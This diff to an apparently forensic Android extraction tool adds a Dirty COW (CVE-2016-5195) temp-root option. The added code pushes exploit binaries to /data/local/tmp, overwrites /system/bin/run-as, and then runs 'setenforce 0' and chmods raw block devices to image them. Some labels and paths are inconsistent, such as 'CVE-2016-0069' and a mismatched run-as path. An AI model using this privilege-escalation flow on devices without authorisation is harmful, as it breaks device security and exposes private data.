@@ -21,6 +21,7 @@ import alex.ufed_style as ufed_style
 import alex.devdump as devdump
 import alex.wifi_adb as wifi_adb
 import alex.exploits as exploits
+import alex.dirty_shell as dirty_shell
 import alex.shot_ut as shot_ut
 import alex.ab_decrypt as ab_decrypt
 import alex.case_uco as case_uco
@@ -187,13 +188,18 @@ class MyApp(ctk.CTk):
             "2020_0069": self.show_2020_0069,
             "2024_31317": self.show_2024_31317,
             "2024_0044": self.show_2024_0044,
+            "2016_5195": self.show_2016_5195,
             "Physical": self.show_physical,
             "DataMenu": self.show_data_menu,
             "AbToPrfs": self.show_ab_to_prfs,
         }
 
     
-    def on_close(self):          
+    def on_close(self):
+        try:
+            adb.server_kill()
+        except Exception as e:
+            print(e)
         self.destroy()
         os._exit(0)
     
@@ -902,10 +908,12 @@ class MyApp(ctk.CTk):
         ctk.CTkButton(self.dynamic_frame, text="CVE-2024-0044 ", command=lambda: self.switch_menu("2024_0044"), width=200, height=50, font=self.stfont),
         ctk.CTkButton(self.dynamic_frame, text="CVE-2024-31317", command=lambda: self.switch_menu("2024_31317"), width=200, height=50, font=self.stfont),
         ctk.CTkButton(self.dynamic_frame, text="CVE-2020-0069 ", command=lambda: self.switch_menu("2020_0069"), width=200, height=50, font=self.stfont),
+        ctk.CTkButton(self.dynamic_frame, text="CVE-2016-5195 ", command=lambda: self.switch_menu("2016_5195"), width=200, height=50, font=self.stfont),
         ]
         self.menu_text = ["Android 12 & 13 with SPL < 03/2024 - Gains access\nto app sandboxes by installing a dummy app.",
                           "Android 9 - 11 with SPL < 06/2024 - Gains system-user\nshell access through a zygote attack.",
-                          "Android < 10 with SPL < 03/2020 - Gains temp-root on\nMediaTek devices. (MT67xx, MT816x, MT817x, MT6580)"]
+                          "Android < 10 with SPL < 03/2020 - Gains temp-root on\nMediaTek devices. (MT67xx, MT816x, MT817x, MT6580)",
+                          "Android < 7 with SPL < 11/2016 - Gains temp-root on\ndevices with Kernel versions between 3.4 and 4.4"]
 
         self.menu_textbox = []
         for btn in self.menu_buttons:
@@ -982,6 +990,30 @@ class MyApp(ctk.CTk):
                     else:
                         self.switch_menu("AcqMenu")
                         return
+            elif int(software.split(".")[0]) < 7 and spl < "2016-11-06":
+                self.choose = ctk.BooleanVar(self, False)
+                self.text.configure(text="This device may be vulnerable to CVE-2016-5195 (Dirty COW).\nFor temporary root access, an executable can be copied to the device's\ntmp directory and executed.\n\nDo you want to continue?")
+                self.yesb = ctk.CTkButton(self.dynamic_frame, text="YES", font=self.stfont, command=lambda: self.choose.set(True))
+                self.yesb.pack(side="left", pady=(20,330), padx=140)
+                self.nob = ctk.CTkButton(self.dynamic_frame, text="NO", font=self.stfont, command=lambda: self.choose.set(False))
+                self.nob.pack(side="left", pady=(20,330))    
+                self.wait_variable(self.choose)  
+                self.yesb.pack_forget()
+                self.nob.pack_forget()
+                if self.choose.get() == True:     
+                    self.text.configure(text="Attempt to gain temp-root via CVE-2016-5195 (Dirty COW).\nPlease Wait ...")
+                    check_su = threading.Thread(target=lambda:temp_dirty_cow(self.change))
+                    check_su.start()
+                    print("devel su tried")
+                    self.wait_variable(self.change)
+                    if self.change.get() == 1:
+                        show_root = True
+                        dshell = True
+                    else:
+                        self.text.configure(text="Root access has not been gained.\nDue to the nature of this process, another attempt may be successful.")
+                        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=40))
+                        return
+
             elif su_app == None:
                 log("No su-manager found.")
                 self.text.configure(text="Please allow the following superuser request on the device.")
@@ -1001,6 +1033,50 @@ class MyApp(ctk.CTk):
             self.text.configure(text="Root access has not been confirmed.")
             self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=40))
             return
+
+    # CVE-2016-0069 Dirty-COW - Check
+    def show_2016_5195(self):
+        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
+        ctk.CTkLabel(self.dynamic_frame, text="", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
+        self.text = ctk.CTkLabel(self.dynamic_frame, text="Checking compatibility ...", width=585, height=60, font=self.stfont, anchor="w", justify="left")
+        self.text.pack(anchor="center", pady=25)
+        global show_root
+        global dcow
+        dcow = False
+        self.change = ctk.IntVar(self, 0)
+        if int(software.split(".")[0]) < 7 and spl < "2016-11-06":
+            self.choose = ctk.BooleanVar(self, False)
+            self.text.configure(text="This device may be vulnerable to CVE-2016-5195 (Dirty COW).\nFor temporary root access, an executable can be copied to the device's\ntmp directory and executed.\n\nDo you want to continue?")
+            self.yesb = ctk.CTkButton(self.dynamic_frame, text="YES", font=self.stfont, command=lambda: self.choose.set(True))
+            self.yesb.pack(side="left", pady=(20,330), padx=140)
+            self.nob = ctk.CTkButton(self.dynamic_frame, text="NO", font=self.stfont, command=lambda: self.choose.set(False))
+            self.nob.pack(side="left", pady=(20,330))    
+            self.wait_variable(self.choose)  
+            self.yesb.pack_forget()
+            self.nob.pack_forget()
+            if self.choose.get() == True:     
+                self.text.configure(text="Attempt to gain temp-root via CVE-2016-0069 (Dirty COW).\nPlease Wait ...")
+                check_su = threading.Thread(target=lambda:temp_dirty_cow(self.change))
+                check_su.start()
+                print("dirty cow tried")
+                self.wait_variable(self.change)
+                if self.change.get() == 1:
+                    show_root = True
+                    mtk_su = True
+                    self.after(100, lambda: self.switch_menu("RootAcq"))
+                    return
+                else:
+                    self.text.configure(text="Root access has not been gained.\nDue to the nature of this process, another attempt may be successful.")
+                    self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("Exploits")).pack(pady=40))
+                    return
+            else:
+                self.switch_menu("Exploits")
+                return
+        else:
+            self.text.configure(text="This device isn't vulnerable to CVE-2016-5195.", anchor="center")
+            self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("Exploits")).pack(pady=40))
+            return
+
 
     # CVE-2020-0069 MTK-SU - Check
     def show_2020_0069(self):
@@ -1178,7 +1254,16 @@ class MyApp(ctk.CTk):
     def show_root_acq_menu(self):
         self.skip = ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont)
         self.skip.grid(row=0, column=0, columnspan=2, sticky="w")
-        if crypt_on == "unencrypted":
+        if dshell == True:
+            self.menu_buttons = [
+                ctk.CTkButton(self.dynamic_frame, text="Filesystem Backup\nMethod 1", command=lambda: self.switch_menu("RootFFS"), width=200, height=70, font=self.stfont, state="disabled"),
+                ctk.CTkButton(self.dynamic_frame, text="Filesystem Backup\nMethod 2", command=lambda: self.switch_menu("TarRootFFS"), width=200, height=70, font=self.stfont, state="disabled"),
+                ctk.CTkButton(self.dynamic_frame, text="Physical Backup", command=lambda: self.switch_menu("Physical"), width=200, height=70, font=self.stfont),
+            ]
+            self.menu_text = ["Creates a FFS Backup of an already\nrooted Device. (As Zip - more reliable)",
+                              "Creates a FFS Backup of an already\nrooted Device. (As Tar - faster)",
+                              "Creates a physical Backup of an already\nrooted Device.",]
+        elif crypt_on == "unencrypted":
             self.menu_buttons = [
                 ctk.CTkButton(self.dynamic_frame, text="Filesystem Backup\nMethod 1", command=lambda: self.switch_menu("RootFFS"), width=200, height=70, font=self.stfont),
                 ctk.CTkButton(self.dynamic_frame, text="Filesystem Backup\nMethod 2", command=lambda: self.switch_menu("TarRootFFS"), width=200, height=70, font=self.stfont),
@@ -2960,6 +3045,10 @@ def get_client(host=default_host, port=default_port, check=False):
             paired = True
             global whoami
             whoami = device.shell("whoami 2>/dev/null")
+            if whoami != "root":
+                check_id = device.shell("id")
+                if "root" in check_id:
+                    whoami = "root"
             osr = device.shell("cat /etc/os-release")
             if whoami == "phablet":
                 ut = True
@@ -3931,7 +4020,7 @@ def tar_root_ffs(outtar, prog_text, change):
                     sys.stdout.flush()
             finally:
                 proc.wait()
-
+    
     change.set(1)
     
 
@@ -3942,6 +4031,7 @@ def physical(change, text, progress, prog_text, pw_box=None, ok_button=None, bac
     global c_su
     global f_hash
     global has_exec_out
+    sh = None
     if has_exec_out:
         out_cmd = "exec-out"
     else:
@@ -3959,7 +4049,9 @@ def physical(change, text, progress, prog_text, pw_box=None, ok_button=None, bac
     #Find block device
     block = ""
     if show_root == True:
-        if device_has_su():
+        if dshell is True:
+            dev_cmd = device.shell("ls /dev")
+        elif device_has_su():
             if c_su:
                 dev_cmd = device.shell("su -c 'ls /dev'")
             else:
@@ -3979,7 +4071,9 @@ def physical(change, text, progress, prog_text, pw_box=None, ok_button=None, bac
         target = "vda"
     elif "block" in dev_cmd:
         if show_root == True:
-            if device_has_su():
+            if dshell is True:
+                dev_cmd = device.shell("ls /dev/block")
+            elif device_has_su():
                 if c_su:
                     dev_cmd = device.shell("su -c 'ls /dev/block'")
                 else:
@@ -3999,6 +4093,7 @@ def physical(change, text, progress, prog_text, pw_box=None, ok_button=None, bac
         target = "vda"
     else:
         target = None
+    print(target)
     if target == None:
         if "nanda" in dev_cmd:
             if show_root == True:
@@ -4016,7 +4111,9 @@ def physical(change, text, progress, prog_text, pw_box=None, ok_button=None, bac
             for target in targets:
                 if "nand" in target:
                     if show_root == True:
-                        if device_has_su():
+                        if dshell is True:
+                            target_size = int(device.shell(f"cat /sys/block/{target}/size"))*512
+                        elif device_has_su():
                             if c_su:
                                 target_size = int(device.shell(f"su -c 'cat /sys/block/{target}/size'"))*512
                             else:
@@ -4131,7 +4228,9 @@ def physical(change, text, progress, prog_text, pw_box=None, ok_button=None, bac
             return
     else:
         if show_root == True:
-            if device_has_su():
+            if dshell is True:
+                size = int(device.shell(f"cat /sys/block/{target}/size"))*512
+            elif device_has_su():
                 if c_su:
                     size = int(device.shell(f"su -c 'cat /sys/block/{target}/size'"))*512
                 else:
@@ -4151,15 +4250,19 @@ def physical(change, text, progress, prog_text, pw_box=None, ok_button=None, bac
                 amiroot = "root"
             else:
                 amiroot = device.shell("whoami 2>/dev/null")
-        if recovery == True:
+        if recovery == True or dshell == True:
             prog_text.pack()
             progress.pack()
             current = 0
-            out_file = f"{snr}_{target}.bin"
             try: os.remove(out_file)
             except: pass
             case_json_name=f"{snr}_{target}.case.json"
             device_path = f"/dev/{block + target}"
+            out_file = f"{snr}_{target}.bin"
+            if dshell is True:
+                with dirty_shell.DirtyShell(["shell", "run-as"]) as ds:
+                    ds.execute(f"setenforce 0")
+                    ds.execute(f"chmod 644 {device_path}")
             proc = Popen(
                 ["adb", "pull", device_path, out_file],
                 stdout=subprocess.DEVNULL,
@@ -4200,8 +4303,9 @@ def physical(change, text, progress, prog_text, pw_box=None, ok_button=None, bac
             try: os.remove(out_file)
             except: pass
             case_json_name=f"{snr}_{target}.case.json"
-            with open(out_file, "wb") as f:
-                device_path = f"/dev/{block + target}"
+            device_path = f"/dev/{block + target}"
+
+            with open(out_file, "wb") as f:         
                 if ut == True:
                     cmd = ['adb', "exec-out",  f"echo {sh_pwd} | sudo -S cat {device_path} 2>/dev/null"]
                 else:
@@ -4239,6 +4343,9 @@ def physical(change, text, progress, prog_text, pw_box=None, ok_button=None, bac
 
                     text.configure(text="Physical Backup is running.\nThis may take some time.")
                     time.sleep(0.3)
+            if sh is not None:
+                sh.close()
+            
             case_end = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
             progress.pack_forget()
             progress = ctk.CTkProgressBar(parent, width=585, height=30, corner_radius=0, mode="indeterminate", indeterminate_speed=0.5)
@@ -4961,6 +5068,57 @@ def supports_exec_out() -> bool:
 
     return proc.stdout.strip() == b"OK"
 
+def temp_dirty_cow(change, timeout=30):
+    global dshell
+    dshell = False
+    if "armeabi" in abi:
+        dcow_bin = os.path.join(os.path.dirname(__file__), "ressources" , "cve", "2016-5195", "arm", "dirtycow")
+        rnas_bin = os.path.join(os.path.dirname(__file__), "ressources" , "cve", "2016-5195", "arm", "run-as")
+    elif abi == "x86":
+        dcow_bin = os.path.join(os.path.dirname(__file__), "ressources" , "cve", "2016-5195", "x86", "dirtycow")
+        rnas_bin = os.path.join(os.path.dirname(__file__), "ressources" , "cve", "2016-5195", "x86", "run-as")
+    elif abi == "x86_64":
+        dcow_bin = os.path.join(os.path.dirname(__file__), "ressources" , "cve", "2016-5195", "x86_64", "dirtycow")
+        rnas_bin = os.path.join(os.path.dirname(__file__), "ressources" , "cve", "2016-5195", "x86_64", "run-as")
+    else:
+        dcow_bin = os.path.join(os.path.dirname(__file__), "ressources" , "cve", "2016-5195", "arm64", "dirtycow")
+        rnas_bin = os.path.join(os.path.dirname(__file__), "ressources" , "cve", "2016-5195", "arm64", "run-as")
+    remote_dcow = "/data/local/tmp/dcow"
+    remote_rnas = "/data/local/tmp/rnas"
+    try:
+        run(["adb", "push", dcow_bin, remote_dcow], check=True)
+        log("Pushed dcow binary to /data/local/tmp")
+        run(["adb", "push", rnas_bin, remote_rnas], check=True)
+        log("Pushed run-as binary to /data/local/tmp")
+    except Exception as e:
+        print(e)
+        pass
+    run(["adb", "shell", f"chmod 777 {remote_dcow}"], check=True)
+    run(["adb", "shell", "/data/local/tmp/dcow /data/local/tmp/run-as /system/bin/run-as --no-pad"], check=True)
+    time.sleep(4)
+    try:
+        stream = device.shell("run-as", stream=True)
+        try:
+            check_dirty = stream.recv(4096)
+        finally:
+            stream.close()
+
+        if "root" in check_dirty.decode():
+            """
+            with dirty_shell.DirtyShell(["shell", "run-as"]) as ds:
+                print(ds.execute("id"))
+            """
+            dshell = True
+            change.set(1)
+            return True
+        else:
+            change.set(2)
+            return False
+    except Exception as e:
+        print(e)
+        change.set(2)
+        return False
+
 def temp_mtk_su(change, timeout=30):
     result_holder = {"value": None}
     if "armeabi" in abi:
@@ -5033,6 +5191,7 @@ adb = None
 state = None
 show_root = False
 mtk_su = False
+dshell = False
 c_su = False
 has_exec_out = True
 bu_pass = None
